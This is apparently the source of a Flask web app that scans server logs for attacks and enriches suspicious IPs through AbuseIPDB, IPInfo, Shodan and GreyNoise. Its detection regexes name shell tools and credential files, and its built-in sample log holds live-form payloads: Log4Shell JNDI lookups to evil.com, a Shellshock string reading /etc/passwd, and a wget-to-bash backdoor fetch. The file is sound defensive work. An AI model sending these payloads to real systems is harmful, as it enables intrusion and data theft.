"""
🔍 Security Log Analyzer v2.0
Advanced server log threat detection with multi-source intelligence
Built by TheGhostPacket
"""

from flask import Flask, render_template, request, jsonify, Response
import requests
import re
import os
import json
import csv
import io
from datetime import datetime, timedelta
from collections import defaultdict, Counter
from urllib.parse import unquote
import ipaddress
import time

app = Flask(__name__)

# API Configuration
ABUSEIPDB_API_KEY = os.environ.get('ABUSEIPDB_API_KEY', '')
IPINFO_TOKEN = os.environ.get('IPINFO_TOKEN', '')
SHODAN_API_KEY = os.environ.get('SHODAN_API_KEY', '')
GREYNOISE_API_KEY = os.environ.get('GREYNOISE_API_KEY', '')

# Detection patterns with severity
SUSPICIOUS_PATTERNS = {
    'sql_injection': {
        'patterns': [
            r"(?i)(union\s+select|select\s+.*\s+from|insert\s+into|delete\s+from|drop\s+table)",
            r"(?i)(or\s+1\s*=\s*1|or\s+'1'\s*=\s*'1'|or\s+\"1\"\s*=\s*\"1\")",
            r"(?i)(;\s*drop|;\s*delete|;\s*update|;\s*insert)",
            r"(?i)(\%27|\')(\s*)(or|and|union)",
            r"(?i)(benchmark\s*\(|sleep\s*\(|waitfor\s+delay)",
            r"(?i)(information_schema|sysobjects|syscolumns)",
            r"(?i)(load_file|into\s+outfile|into\s+dumpfile)",
        ],
        'severity': 'critical',
        'description': 'SQL Injection - Attempts to manipulate database queries'
    },
    'xss_attack': {
        'patterns': [
            r"(?i)(<script|javascript:|on\w+\s*=)",
            r"(?i)(alert\s*\(|confirm\s*\(|prompt\s*\()",
            r"(?i)(<img[^>]+onerror|<svg[^>]+onload)",
            r"(?i)(document\.cookie|document\.location|document\.write)",
            r"(?i)(eval\s*\(|expression\s*\()",
        ],
        'severity': 'high',
        'description': 'Cross-Site Scripting - Script injection attempts'
    },
    'path_traversal': {
        'patterns': [
            r"(\.\.\/|\.\.\\){2,}",
            r"(?i)(\/etc\/passwd|\/etc\/shadow|\/etc\/hosts)",
            r"(?i)(c:\\windows|c:\\boot\.ini|c:\\inetpub)",
            r"(?i)(\/proc\/self|\/dev\/null)",
        ],
        'severity': 'high',
        'description': 'Path Traversal - Attempts to access restricted files'
    },
    'command_injection': {
        'patterns': [
            r"(?i)(;\s*cat\s+|;\s*ls\s+|;\s*wget\s+|;\s*curl\s+)",
            r"(?i)(\|\s*cat\s+|\|\s*ls\s+|\|\s*id\s*$|\|\s*whoami)",
            r"(?i)(`[^`]+`|\$\([^)]+\))",
            r"(?i)(;\s*rm\s+-rf|;\s*chmod|;\s*chown)",
            r"(?i)(\|\s*nc\s+|\|\s*netcat|;\s*bash\s+-i)",
        ],
        'severity': 'critical',
        'description': 'Command Injection - OS command execution attempts'
    },
    'lfi_rfi': {
        'patterns': [
            r"(?i)(php:\/\/filter|php:\/\/input|data:\/\/)",
            r"(?i)(expect:\/\/|phar:\/\/)",
            r"(?i)(file:\/\/|dict:\/\/|gopher:\/\/)",
            r"(?i)(\.php\?.*=https?:\/\/|\.php\?.*=ftp:\/\/)",
        ],
        'severity': 'critical',
        'description': 'LFI/RFI - Local/Remote File Inclusion'
    },
    'xxe_attack': {
        'patterns': [
            r"(?i)(<!DOCTYPE[^>]*\[|<!ENTITY)",
            r"(?i)(SYSTEM\s+[\"']file:)",
            r"(?i)(SYSTEM\s+[\"']https?:)",
        ],
        'severity': 'critical',
        'description': 'XXE - XML External Entity Injection'
    },
    'scanner_tools': {
        'patterns': [
            r"(?i)(nikto|sqlmap|nmap|masscan|zap|burp|acunetix)",
            r"(?i)(dirbuster|gobuster|wfuzz|ffuf|dirb)",
            r"(?i)(hydra|medusa|patator|hashcat)",
            r"(?i)(nessus|openvas|qualys|nexpose)",
            r"(?i)(metasploit|msfconsole|meterpreter)",
        ],
        'severity': 'high',
        'description': 'Security Scanner - Automated vulnerability scanning'
    },
    'webshell': {
        'patterns': [
            r"(?i)(c99|r57|b374k|weevely|china\s*chopper)",
            r"(?i)(phpspy|webadmin|shell\.php|cmd\.php)",
            r"(?i)(passthru|shell_exec|system\s*\(|exec\s*\()",
        ],
        'severity': 'critical',
        'description': 'Web Shell - Backdoor access attempts'
    },
    'log4j': {
        'patterns': [
            r"(?i)(\$\{jndi:|ldap:\/\/|\$\{env:)",
            r"(?i)(\$\{lower:|upper:|base64:)",
        ],
        'severity': 'critical',
        'description': 'Log4j/JNDI - Log4Shell exploitation attempt'
    },
    'wordpress_attack': {
        'patterns': [
            r"(?i)(wp-admin|wp-login|wp-content\/uploads)",
            r"(?i)(xmlrpc\.php|wp-config\.php)",
            r"(?i)(\/wp-includes\/|\/wp-json\/)",
        ],
        'severity': 'medium',
        'description': 'WordPress Attack - CMS-specific exploitation'
    }
}

# Suspicious user agents with categories
SUSPICIOUS_USER_AGENTS = {
    'scanners': ['nikto', 'sqlmap', 'nmap', 'masscan', 'zap', 'burp', 'acunetix', 'nessus', 'qualys'],
    'fuzzers': ['dirbuster', 'gobuster', 'wfuzz', 'ffuf', 'dirb', 'feroxbuster'],
    'exploits': ['metasploit', 'msfconsole', 'exploit', 'payload', 'shellshock'],
    'bots': ['bot', 'crawler', 'spider', 'scraper', 'harvest'],
    'suspicious': ['python-requests', 'curl/', 'wget/', 'libwww', 'lwp-trivial', 'php/'],
}

# Log format patterns
LOG_PATTERNS = {
    'apache_combined': r'^(?P<ip>[\d\.]+)\s+-\s+(?P<user>\S+)\s+\[(?P<timestamp>[^\]]+)\]\s+"(?P<method>\w+)\s+(?P<path>[^\s]+)\s+[^"]+"\s+(?P<status>\d+)\s+(?P<size>\d+|-)\s+"(?P<referer>[^"]*)"\s+"(?P<useragent>[^"]*)"',
    'apache_common': r'^(?P<ip>[\d\.]+)\s+-\s+(?P<user>\S+)\s+\[(?P<timestamp>[^\]]+)\]\s+"(?P<method>\w+)\s+(?P<path>[^\s]+)\s+[^"]+"\s+(?P<status>\d+)\s+(?P<size>\d+|-)',
    'nginx': r'^(?P<ip>[\d\.]+)\s+-\s+(?P<user>\S+)\s+\[(?P<timestamp>[^\]]+)\]\s+"(?P<method>\w+)\s+(?P<path>[^\s]+)\s+[^"]+"\s+(?P<status>\d+)\s+(?P<size>\d+)',
    'nginx_error': r'^(?P<timestamp>\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2})\s+\[(?P<level>\w+)\]\s+.*?client:\s+(?P<ip>[\d\.]+)',
    'ssh_failed': r'^(?P<timestamp>\w+\s+\d+\s+[\d:]+)\s+\S+\s+sshd\[.*\]:\s+Failed\s+password\s+for\s+(?:invalid\s+user\s+)?(?P<user>\S+)\s+from\s+(?P<ip>[\d\.]+)',
    'ssh_accepted': r'^(?P<timestamp>\w+\s+\d+\s+[\d:]+)\s+\S+\s+sshd\[.*\]:\s+Accepted\s+\w+\s+for\s+(?P<user>\S+)\s+from\s+(?P<ip>[\d\.]+)',
    'auth_failed': r'^(?P<timestamp>\w+\s+\d+\s+[\d:]+)\s+\S+\s+\S+\[.*\]:\s+.*(?:failed|invalid|error).*from\s+(?P<ip>[\d\.]+)',
}


def is_valid_ip(ip):
    """Check if string is a valid IP address"""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def is_private_ip(ip):
    """Check if IP is private/internal"""
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


def parse_log_line(line):
    """Try to parse a log line with different formats"""
    for format_name, pattern in LOG_PATTERNS.items():
        match = re.match(pattern, line.strip())
        if match:
            data = match.groupdict()
            data['format'] = format_name
            return data
    return None


def parse_timestamp(ts_string):
    """Parse various timestamp formats"""
    formats = [
        '%d/%b/%Y:%H:%M:%S %z',  # Apache
        '%d/%b/%Y:%H:%M:%S',
        '%Y/%m/%d %H:%M:%S',  # Nginx error
        '%b %d %H:%M:%S',  # Syslog
    ]
    for fmt in formats:
        try:
            return datetime.strptime(ts_string.strip(), fmt)
        except:
            continue
    return None


def detect_threats(parsed_line):
    """Detect threats in a parsed log line"""
    threats = []
    
    if not parsed_line:
        return threats
    
    path = parsed_line.get('path', '')
    useragent = parsed_line.get('useragent', '')
    status = parsed_line.get('status', '')
    method = parsed_line.get('method', '')
    
    # Decode URL encoding
    try:
        decoded_path = unquote(path)
    except:
        decoded_path = path
    
    # Check for attack patterns
    for threat_type, config in SUSPICIOUS_PATTERNS.items():
        for pattern in config['patterns']:
            if re.search(pattern, decoded_path) or re.search(pattern, useragent):
                threats.append({
                    'type': threat_type,
                    'evidence': decoded_path[:200] if decoded_path else useragent[:200],
                    'severity': config['severity'],
                    'description': config['description']
                })
                break
    
    # Check user agent
    if useragent:
        useragent_lower = useragent.lower()
        for category, agents in SUSPICIOUS_USER_AGENTS.items():
            for suspicious in agents:
                if suspicious in useragent_lower:
                    threats.append({
                        'type': f'suspicious_ua_{category}',
                        'evidence': useragent[:100],
                        'severity': 'medium' if category in ['bots', 'suspicious'] else 'high',
                        'description': f'Suspicious User Agent ({category})'
                    })
                    break
    
    # HTTP method anomalies
    if method in ['PUT', 'DELETE', 'TRACE', 'CONNECT']:
        threats.append({
            'type': 'suspicious_method',
            'evidence': f'{method} {path[:50]}',
            'severity': 'medium',
            'description': f'Suspicious HTTP Method: {method}'
        })
    
    # Status code analysis
    if status == '404':
        threats.append({
            'type': 'enumeration',
            'evidence': path[:100],
            'severity': 'low',
            'description': 'Directory/File Enumeration (404)'
        })
    elif status in ['401', '403']:
        threats.append({
            'type': 'auth_failure',
            'evidence': f"Status {status} on {path[:50]}",
            'severity': 'medium',
            'description': 'Authentication/Authorization Failure'
        })
    elif status == '500':
        threats.append({
            'type': 'server_error',
            'evidence': path[:100],
            'severity': 'low',
            'description': 'Server Error - Possible exploit attempt'
        })
    
    return threats


def check_ip_abuseipdb(ip):
    """Check IP reputation on AbuseIPDB"""
    if not ABUSEIPDB_API_KEY or not is_valid_ip(ip) or is_private_ip(ip):
        return None
    
    try:
        url = "https://api.abuseipdb.com/api/v2/check"
        headers = {
            'Key': ABUSEIPDB_API_KEY,
            'Accept': 'application/json'
        }
        params = {
            'ipAddress': ip,
            'maxAgeInDays': 90,
            'verbose': True
        }
        
        response = requests.get(url, headers=headers, params=params, timeout=10)
        
        if response.status_code == 200:
            data = response.json().get('data', {})
            return {
                'abuse_score': data.get('abuseConfidenceScore', 0),
                'total_reports': data.get('totalReports', 0),
                'country': data.get('countryCode', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'domain': data.get('domain', 'Unknown'),
                'is_tor': data.get('isTor', False),
                'is_public': data.get('isPublic', True),
                'usage_type': data.get('usageType', 'Unknown'),
                'last_reported': data.get('lastReportedAt', None)
            }
    except Exception as e:
        print(f"AbuseIPDB error: {e}")
    
    return None


def check_ip_ipinfo(ip):
    """Get IP geolocation from IPInfo"""
    if not IPINFO_TOKEN or not is_valid_ip(ip) or is_private_ip(ip):
        return None
    
    try:
        url = f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            loc = data.get('loc', '0,0').split(',')
            return {
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'org': data.get('org', 'Unknown'),
                'timezone': data.get('timezone', 'Unknown'),
                'latitude': float(loc[0]) if len(loc) > 0 else 0,
                'longitude': float(loc[1]) if len(loc) > 1 else 0
            }
    except Exception as e:
        print(f"IPInfo error: {e}")
    
    return None


def check_ip_shodan(ip):
    """Check IP on Shodan for open ports/vulnerabilities"""
    if not SHODAN_API_KEY or not is_valid_ip(ip) or is_private_ip(ip):
        return None
    
    try:
        url = f"https://api.shodan.io/shodan/host/{ip}?key={SHODAN_API_KEY}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            return {
                'ports': data.get('ports', []),
                'hostnames': data.get('hostnames', []),
                'os': data.get('os', 'Unknown'),
                'vulns': list(data.get('vulns', {}).keys()) if 'vulns' in data else [],
                'tags': data.get('tags', [])
            }
    except Exception as e:
        print(f"Shodan error: {e}")
    
    return None


def check_ip_greynoise(ip):
    """Check IP on GreyNoise for scanner/bot activity"""
    if not GREYNOISE_API_KEY or not is_valid_ip(ip) or is_private_ip(ip):
        return None
    
    try:
        url = f"https://api.greynoise.io/v3/community/{ip}"
        headers = {
            'key': GREYNOISE_API_KEY
        }
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            return {
                'noise': data.get('noise', False),
                'riot': data.get('riot', False),
                'classification': data.get('classification', 'unknown'),
                'name': data.get('name', 'Unknown'),
                'last_seen': data.get('last_seen', None)
            }
    except Exception as e:
        print(f"GreyNoise error: {e}")
    
    return None


def analyze_logs(log_content):
    """Main log analysis function"""
    lines = log_content.strip().split('\n')
    
    # Statistics
    total_lines = len(lines)
    parsed_lines = 0
    
    # Tracking
    ip_requests = defaultdict(int)
    ip_threats = defaultdict(list)
    ip_failed_auths = defaultdict(int)
    ip_404s = defaultdict(int)
    ip_methods = defaultdict(Counter)
    threats_by_type = Counter()
    threats_by_severity = Counter()
    all_threats = []
    timeline = defaultdict(lambda: {'requests': 0, 'threats': 0})
    paths_accessed = Counter()
    attacked_paths = Counter()
    user_agents = Counter()
    status_codes = Counter()
    methods_used = Counter()
    hourly_activity = defaultdict(int)
    
    # Parse each line
    for line in lines:
        if not line.strip():
            continue
        
        parsed = parse_log_line(line)
        if not parsed:
            continue
        
        parsed_lines += 1
        ip = parsed.get('ip', '')
        
        if ip:
            ip_requests[ip] += 1
        
        # Track timestamp for timeline
        ts = parsed.get('timestamp', '')
        if ts:
            parsed_ts = parse_timestamp(ts)
            if parsed_ts:
                hour_key = parsed_ts.strftime('%H:00')
                hourly_activity[hour_key] += 1
                date_key = parsed_ts.strftime('%Y-%m-%d')
                timeline[date_key]['requests'] += 1
        
        # Track methods
        method = parsed.get('method', '')
        if method:
            methods_used[method] += 1
            if ip:
                ip_methods[ip][method] += 1
        
        # Track status codes
        status = parsed.get('status', '')
        if status:
            status_codes[status] += 1
        
        # Track paths
        path = parsed.get('path', '')
        if path:
            # Normalize path
            clean_path = path.split('?')[0]
            paths_accessed[clean_path] += 1
        
        # Track user agents
        ua = parsed.get('useragent', '')
        if ua and ua != '-':
            user_agents[ua] += 1
        
        # Track 404s per IP
        if status == '404' and ip:
            ip_404s[ip] += 1
        
        # Track failed auths
        if 'ssh_failed' in parsed.get('format', '') or 'auth_failed' in parsed.get('format', '') or status in ['401', '403']:
            if ip:
                ip_failed_auths[ip] += 1
        
        # Detect threats
        threats = detect_threats(parsed)
        for threat in threats:
            threat['ip'] = ip
            threat['timestamp'] = parsed.get('timestamp', '')
            threat['path'] = parsed.get('path', '')
            threat['method'] = method
            all_threats.append(threat)
            threats_by_type[threat['type']] += 1
            threats_by_severity[threat['severity']] += 1
            if ip:
                ip_threats[ip].append(threat)
            if path:
                attacked_paths[path.split('?')[0]] += 1
            if ts:
                parsed_ts = parse_timestamp(ts)
                if parsed_ts:
                    date_key = parsed_ts.strftime('%Y-%m-%d')
                    timeline[date_key]['threats'] += 1
    
    # Identify brute force attacks
    brute_force_ips = {ip: count for ip, count in ip_failed_auths.items() if count >= 5}
    
    # Identify scanners
    scanner_ips = {ip: count for ip, count in ip_404s.items() if count >= 20}
    
    # Calculate IP risk scores
    ip_scores = {}
    all_suspicious = set(brute_force_ips.keys()) | set(scanner_ips.keys()) | set(ip_threats.keys())
    
    for ip in all_suspicious:
        score = 0
        score += brute_force_ips.get(ip, 0) * 3
        score += scanner_ips.get(ip, 0) * 0.5
        score += len([t for t in ip_threats.get(ip, []) if t['severity'] == 'critical']) * 20
        score += len([t for t in ip_threats.get(ip, []) if t['severity'] == 'high']) * 10
        score += len([t for t in ip_threats.get(ip, []) if t['severity'] == 'medium']) * 5
        score += len([t for t in ip_threats.get(ip, []) if t['severity'] == 'low']) * 1
        ip_scores[ip] = min(score, 100)
    
    sorted_ips = sorted(ip_scores.items(), key=lambda x: x[1], reverse=True)[:30]
    
    # Enrich top IPs with threat intelligence
    suspicious_ips = []
    for ip, score in sorted_ips[:15]:
        ip_info = {
            'ip': ip,
            'requests': ip_requests[ip],
            'failed_auths': ip_failed_auths.get(ip, 0),
            'not_found_errors': ip_404s.get(ip, 0),
            'threats': len(ip_threats.get(ip, [])),
            'threat_types': list(set([t['type'] for t in ip_threats.get(ip, [])])),
            'risk_score': score,
            'methods': dict(ip_methods[ip])
        }
        
        # Check all threat intelligence sources
        abuse_data = check_ip_abuseipdb(ip)
        if abuse_data:
            ip_info['abuse_score'] = abuse_data['abuse_score']
            ip_info['total_reports'] = abuse_data['total_reports']
            ip_info['is_tor'] = abuse_data['is_tor']
            ip_info['isp'] = abuse_data['isp']
            ip_info['usage_type'] = abuse_data.get('usage_type', 'Unknown')
        
        geo_data = check_ip_ipinfo(ip)
        if geo_data:
            ip_info['country'] = geo_data['country']
            ip_info['city'] = geo_data['city']
            ip_info['org'] = geo_data['org']
            ip_info['latitude'] = geo_data['latitude']
            ip_info['longitude'] = geo_data['longitude']
        
        shodan_data = check_ip_shodan(ip)
        if shodan_data:
            ip_info['open_ports'] = shodan_data['ports']
            ip_info['vulns'] = shodan_data['vulns']
            ip_info['os'] = shodan_data['os']
        
        greynoise_data = check_ip_greynoise(ip)
        if greynoise_data:
            ip_info['is_known_scanner'] = greynoise_data['noise']
            ip_info['scanner_name'] = greynoise_data['name']
            ip_info['classification'] = greynoise_data['classification']
        
        suspicious_ips.append(ip_info)
        time.sleep(0.2)  # Rate limiting
    
    # Calculate overall threat level
    critical_threats = threats_by_severity.get('critical', 0)
    high_threats = threats_by_severity.get('high', 0)
    medium_threats = threats_by_severity.get('medium', 0)
    
    if critical_threats > 5 or len(brute_force_ips) > 5:
        overall_threat = 'critical'
    elif critical_threats > 0 or high_threats > 10 or len(brute_force_ips) > 2:
        overall_threat = 'high'
    elif high_threats > 0 or medium_threats > 20 or len(brute_force_ips) > 0:
        overall_threat = 'medium'
    elif medium_threats > 0 or len(scanner_ips) > 0:
        overall_threat = 'low'
    else:
        overall_threat = 'clean'
    
    # Generate recommendations
    recommendations = []
    
    if brute_force_ips:
        top_attackers = sorted(brute_force_ips.items(), key=lambda x: x[1], reverse=True)[:3]
        recommendations.append({
            'type': 'critical',
            'title': 'Block Brute Force Attackers',
            'description': f"Detected {len(brute_force_ips)} IPs attempting brute force. Top: {', '.join([ip for ip, _ in top_attackers])}",
            'action': 'Add to firewall blocklist, enable fail2ban, implement account lockout'
        })
    
    if threats_by_type.get('sql_injection', 0) > 0:
        recommendations.append({
            'type': 'critical',
            'title': 'SQL Injection Attempts Detected',
            'description': f"{threats_by_type['sql_injection']} SQL injection attempts found",
            'action': 'Use parameterized queries, implement WAF rules, validate all inputs'
        })
    
    if threats_by_type.get('command_injection', 0) > 0:
        recommendations.append({
            'type': 'critical',
            'title': 'Command Injection Attempts',
            'description': f"{threats_by_type['command_injection']} command injection attempts detected",
            'action': 'Never pass user input to shell commands, use safe APIs'
        })
    
    if threats_by_type.get('log4j', 0) > 0:
        recommendations.append({
            'type': 'critical',
            'title': 'Log4Shell Exploitation Attempts',
            'description': f"{threats_by_type['log4j']} Log4j/JNDI injection attempts",
            'action': 'Update Log4j immediately, block JNDI lookups at WAF level'
        })
    
    if scanner_ips:
        recommendations.append({
            'type': 'warning',
            'title': 'Automated Scanning Detected',
            'description': f"{len(scanner_ips)} IPs performing directory enumeration",
            'action': 'Rate limit requests, implement CAPTCHA, block known scanner IPs'
        })
    
    if threats_by_type.get('xss_attack', 0) > 0:
        recommendations.append({
            'type': 'warning',
            'title': 'XSS Attack Attempts',
            'description': f"{threats_by_type['xss_attack']} cross-site scripting attempts",
            'action': 'Implement Content Security Policy, sanitize outputs, use HTTPOnly cookies'
        })
    
    # Check for suspicious patterns in user agents
    scanner_ua_count = sum(1 for ua in user_agents if any(s in ua.lower() for s in ['sqlmap', 'nikto', 'nmap', 'burp']))
    if scanner_ua_count > 0:
        recommendations.append({
            'type': 'warning',
            'title': 'Known Attack Tools Detected',
            'description': f"Requests from known security scanners/attack tools",
            'action': 'Block known malicious user agents at WAF level'
        })
    
    if not recommendations:
        recommendations.append({
            'type': 'success',
            'title': 'No Critical Issues Found',
            'description': 'Your logs look clean. Continue monitoring.',
            'action': 'Maintain regular log review schedule'
        })
    
    # Prepare timeline data
    timeline_data = []
    for date, data in sorted(timeline.items()):
        timeline_data.append({
            'date': date,
            'requests': data['requests'],
            'threats': data['threats']
        })
    
    # Prepare hourly data
    hourly_data = []
    for hour in [f"{h:02d}:00" for h in range(24)]:
        hourly_data.append({
            'hour': hour,
            'count': hourly_activity.get(hour, 0)
        })
    
    # Country breakdown
    country_counts = Counter()
    for ip_data in suspicious_ips:
        country = ip_data.get('country', 'Unknown')
        if country:
            country_counts[country] += 1
    
    return {
        'summary': {
            'total_lines': total_lines,
            'parsed_lines': parsed_lines,
            'parse_rate': round((parsed_lines / total_lines * 100) if total_lines > 0 else 0, 1),
            'total_threats': len(all_threats),
            'critical_severity': critical_threats,
            'high_severity': high_threats,
            'medium_severity': medium_threats,
            'low_severity': threats_by_severity.get('low', 0),
            'unique_ips': len(ip_requests),
            'brute_force_ips': len(brute_force_ips),
            'scanner_ips': len(scanner_ips),
            'overall_threat': overall_threat
        },
        'threats_by_type': dict(threats_by_type),
        'threats_by_severity': dict(threats_by_severity),
        'suspicious_ips': suspicious_ips,
        'top_paths': dict(paths_accessed.most_common(15)),
        'attacked_paths': dict(attacked_paths.most_common(10)),
        'status_codes': dict(status_codes),
        'methods': dict(methods_used),
        'user_agents': dict(user_agents.most_common(10)),
        'recommendations': recommendations,
        'recent_threats': all_threats[:100],
        'timeline': timeline_data,
        'hourly_activity': hourly_data,
        'countries': dict(country_counts.most_common(10)),
        'brute_force_ips': list(brute_force_ips.keys())[:10]
    }


# Routes
@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/analyze', methods=['POST'])
def api_analyze():
    """Analyze uploaded log file"""
    
    if 'file' in request.files:
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': True, 'message': 'No file selected'}), 400
        
        try:
            content = file.read().decode('utf-8', errors='ignore')
        except Exception as e:
            return jsonify({'error': True, 'message': f'Error reading file: {str(e)}'}), 400
    
    elif request.is_json:
        data = request.get_json()
        content = data.get('content', '')
    
    else:
        return jsonify({'error': True, 'message': 'No log data provided'}), 400
    
    if not content or len(content.strip()) == 0:
        return jsonify({'error': True, 'message': 'Log file is empty'}), 400
    
    if len(content) > 20 * 1024 * 1024:  # 20MB limit
        return jsonify({'error': True, 'message': 'File too large (max 20MB)'}), 400
    
    try:
        results = analyze_logs(content)
        return jsonify(results)
    except Exception as e:
        return jsonify({'error': True, 'message': f'Analysis error: {str(e)}'}), 500


@app.route('/api/check-ip', methods=['POST'])
def api_check_ip():
    """Check a single IP address"""
    data = request.get_json()
    ip = data.get('ip', '').strip()
    
    if not ip:
        return jsonify({'error': True, 'message': 'No IP provided'}), 400
    
    if not is_valid_ip(ip):
        return jsonify({'error': True, 'message': 'Invalid IP address'}), 400
    
    result = {
        'ip': ip,
        'is_private': is_private_ip(ip)
    }
    
    if not is_private_ip(ip):
        abuse_data = check_ip_abuseipdb(ip)
        if abuse_data:
            result['abuseipdb'] = abuse_data
        
        geo_data = check_ip_ipinfo(ip)
        if geo_data:
            result['ipinfo'] = geo_data
        
        shodan_data = check_ip_shodan(ip)
        if shodan_data:
            result['shodan'] = shodan_data
        
        greynoise_data = check_ip_greynoise(ip)
        if greynoise_data:
            result['greynoise'] = greynoise_data
    
    return jsonify(result)


@app.route('/api/export/csv', methods=['POST'])
def export_csv():
    """Export results as CSV"""
    data = request.get_json()
    
    output = io.StringIO()
    writer = csv.writer(output)
    
    # Header
    writer.writerow(['IP Address', 'Country', 'City', 'Requests', 'Threats', 'Risk Score', 'Abuse Score', 'Is TOR', 'ISP'])
    
    for ip_data in data.get('suspicious_ips', []):
        writer.writerow([
            ip_data.get('ip', ''),
            ip_data.get('country', 'Unknown'),
            ip_data.get('city', 'Unknown'),
            ip_data.get('requests', 0),
            ip_data.get('threats', 0),
            ip_data.get('risk_score', 0),
            ip_data.get('abuse_score', 'N/A'),
            ip_data.get('is_tor', False),
            ip_data.get('isp', 'Unknown')
        ])
    
    output.seek(0)
    return Response(
        output.getvalue(),
        mimetype='text/csv',
        headers={'Content-Disposition': 'attachment; filename=security_report.csv'}
    )


@app.route('/api/export/json', methods=['POST'])
def export_json():
    """Export results as JSON"""
    data = request.get_json()
    
    return Response(
        json.dumps(data, indent=2),
        mimetype='application/json',
        headers={'Content-Disposition': 'attachment; filename=security_report.json'}
    )


@app.route('/api/sample-logs')
def api_sample_logs():
    """Return sample log data for testing"""
    sample = """192.168.1.100 - - [16/Dec/2025:10:15:32 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
185.220.101.45 - - [16/Dec/2025:10:15:33 +0000] "POST /login HTTP/1.1" 401 0 "-" "Mozilla/5.0"
185.220.101.45 - - [16/Dec/2025:10:15:34 +0000] "POST /login HTTP/1.1" 401 0 "-" "Mozilla/5.0"
185.220.101.45 - - [16/Dec/2025:10:15:35 +0000] "POST /login HTTP/1.1" 401 0 "-" "Mozilla/5.0"
185.220.101.45 - - [16/Dec/2025:10:15:36 +0000] "POST /login HTTP/1.1" 401 0 "-" "Mozilla/5.0"
185.220.101.45 - - [16/Dec/2025:10:15:37 +0000] "POST /login HTTP/1.1" 401 0 "-" "Mozilla/5.0"
185.220.101.45 - - [16/Dec/2025:10:15:38 +0000] "POST /login HTTP/1.1" 401 0 "-" "Mozilla/5.0"
45.33.32.156 - - [16/Dec/2025:10:20:15 +0000] "GET /search?id=1' OR '1'='1 HTTP/1.1" 200 5678 "-" "sqlmap/1.5.2#stable"
45.33.32.156 - - [16/Dec/2025:10:20:16 +0000] "GET /admin' UNION SELECT username,password FROM users-- HTTP/1.1" 200 5678 "-" "sqlmap/1.5.2"
45.33.32.156 - - [16/Dec/2025:10:20:17 +0000] "GET /page?file=../../../etc/passwd HTTP/1.1" 200 1234 "-" "sqlmap/1.5.2"
103.45.67.89 - - [16/Dec/2025:10:25:00 +0000] "GET /admin HTTP/1.1" 404 0 "-" "DirBuster-1.0-RC1"
103.45.67.89 - - [16/Dec/2025:10:25:01 +0000] "GET /administrator HTTP/1.1" 404 0 "-" "DirBuster-1.0-RC1"
103.45.67.89 - - [16/Dec/2025:10:25:02 +0000] "GET /wp-admin HTTP/1.1" 404 0 "-" "DirBuster-1.0-RC1"
103.45.67.89 - - [16/Dec/2025:10:25:03 +0000] "GET /phpmyadmin HTTP/1.1" 404 0 "-" "DirBuster-1.0-RC1"
103.45.67.89 - - [16/Dec/2025:10:25:04 +0000] "GET /.git/config HTTP/1.1" 404 0 "-" "DirBuster-1.0-RC1"
103.45.67.89 - - [16/Dec/2025:10:25:05 +0000] "GET /.env HTTP/1.1" 404 0 "-" "DirBuster-1.0-RC1"
192.168.1.50 - - [16/Dec/2025:10:30:00 +0000] "GET /page?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
192.168.1.50 - - [16/Dec/2025:10:30:01 +0000] "GET /search?term=<img src=x onerror=alert('XSS')> HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
178.128.23.45 - - [16/Dec/2025:10:35:00 +0000] "GET /?x=${jndi:ldap://evil.com/a} HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
178.128.23.45 - - [16/Dec/2025:10:35:01 +0000] "POST /api/data HTTP/1.1" 200 1234 "-" "${jndi:ldap://attacker.com/exploit}"
91.234.56.78 - - [16/Dec/2025:10:40:00 +0000] "GET /cgi-bin/;cat /etc/passwd HTTP/1.1" 200 0 "-" "() { :; }; /bin/bash -c 'cat /etc/passwd'"
91.234.56.78 - - [16/Dec/2025:10:40:01 +0000] "GET /shell?cmd=wget http://evil.com/backdoor.sh|bash HTTP/1.1" 200 0 "-" "Mozilla/5.0"
192.168.1.100 - - [16/Dec/2025:10:45:00 +0000] "GET /style.css HTTP/1.1" 200 5678 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.100 - - [16/Dec/2025:10:45:01 +0000] "GET /script.js HTTP/1.1" 200 9012 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.100 - - [16/Dec/2025:10:45:02 +0000] "GET /images/logo.png HTTP/1.1" 200 3456 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
8.8.8.8 - - [16/Dec/2025:10:50:00 +0000] "GET /api/status HTTP/1.1" 200 123 "-" "Googlebot/2.1"
Dec 16 10:55:00 server sshd[1234]: Failed password for invalid user admin from 185.220.101.45 port 22 ssh2
Dec 16 10:55:01 server sshd[1234]: Failed password for invalid user root from 185.220.101.45 port 22 ssh2
Dec 16 10:55:02 server sshd[1234]: Failed password for invalid user test from 185.220.101.45 port 22 ssh2"""
    
    return jsonify({'sample': sample})


@app.route('/api/status')
def api_status():
    """Check API status"""
    return jsonify({
        'abuseipdb': bool(ABUSEIPDB_API_KEY),
        'ipinfo': bool(IPINFO_TOKEN),
        'shodan': bool(SHODAN_API_KEY),
        'greynoise': bool(GREYNOISE_API_KEY)
    })


@app.errorhandler(404)
def not_found(error):
    if request.path.startswith('/api/'):
        return jsonify({'error': True, 'message': 'Endpoint not found'}), 404
    return render_template('index.html'), 404


@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': True, 'message': 'Internal server error'}), 500


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
